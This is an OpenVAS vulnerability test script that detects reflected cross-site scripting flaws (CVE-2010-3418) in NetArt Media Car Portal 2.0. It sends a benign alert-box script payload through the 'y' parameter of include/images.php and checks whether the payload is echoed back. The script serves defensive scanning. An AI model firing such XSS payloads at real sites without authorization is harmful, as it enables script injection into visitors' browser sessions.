##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_netart_media_car_portal_mult_xss_vuln.nasl 14326 2019-03-19 13:40:32Z jschulte $
#
# NetArt Media Car Portal Multiple Cross-site Scripting Vulnerabilities
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801454");
  script_version("$Revision: 14326 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 14:40:32 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2010-10-05 07:29:45 +0200 (Tue, 05 Oct 2010)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_cve_id("CVE-2010-3418");
  script_bugtraq_id(43145);
  script_name("NetArt Media Car Portal Multiple Cross-site Scripting Vulnerabilities");
  script_xref(name:"URL", value:"http://secunia.com/advisories/41366");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/61728");
  script_xref(name:"URL", value:"http://pridels-team.blogspot.com/2010/09/netartmedia-car-portal-v20-xss-vuln.html");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"insight", value:"Input passed via the 'y' parameter to 'include/images.php' and
  'car_id' parameter to 'index.php' are not properly sanitised.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"This host is running NetArt Media Car Portal and is prone to
  multiple cross-site scripting vulnerabilities.");
  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");
  script_tag(name:"affected", value:"NetArt Media Car Portal version 2.0");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_app");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

carPort = get_http_port(default:80);

if(!can_host_php(port:carPort)){
  exit(0);
}

foreach dir (make_list_unique("/car_portal", "/", cgi_dirs(port:carPort)))
{

  if(dir == "/") dir = "";

  rcvRes = http_get_cache(item: dir + "/index.php", port:carPort);

  if(">Car Portal<" >< rcvRes)
  {
    sndReq = http_get(item:string(dir, '/include/images.php?y=<script>' +
                           'alert("OpenVAS-XSS")</script>'), port:carPort);
    rcvRes = http_keepalive_send_recv(port:carPort, data:sndReq);

    if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 .*", string:rcvRes) &&
                    '<script>alert(\"OpenVAS-XSS\")</script>' >< rcvRes){
      security_message(port:carPort);
      exit(0);
    }
  }
}

exit(99);